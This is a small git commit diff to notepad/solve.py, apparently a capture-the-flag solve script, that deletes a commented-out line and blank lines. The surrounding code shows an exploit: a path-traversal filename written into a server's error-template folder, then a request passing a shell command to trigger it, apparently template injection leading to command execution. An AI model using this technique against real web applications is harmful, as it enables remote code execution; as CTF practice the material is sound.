29be713466869c210294268da1bfb5e0df6c2c45
execut3 <execut3.binarycodes@gmail.com>
2024-03-10 00:05:18 +0330

    small cleaning

--- notepad/solve.py
+++ notepad/solve.py
@@ -8,8 +8,6 @@ path_content = '..\\templates\\errors\\test' + (128-len('..\\templates\\errors\\
 content = path_content + payload_content
 shell = sys.argv[2]
 
-# content = content.replace("_", "requests.args.get('v)")
-
 response = requests.post(f'{base_url}/new', data={'content': content}, allow_redirects=False)
 redirected_url = response.headers['Location']
 filename = redirected_url.split('/')[-1]
@@ -19,5 +17,3 @@ print(f'[+] File created with name: {filename}')
 response = requests.get(f'''{base_url}/?error={filename.rstrip(".html")}&c=_&shell={shell}''')
 print('[+] Printing content of file')
 print(response.text)
-
-
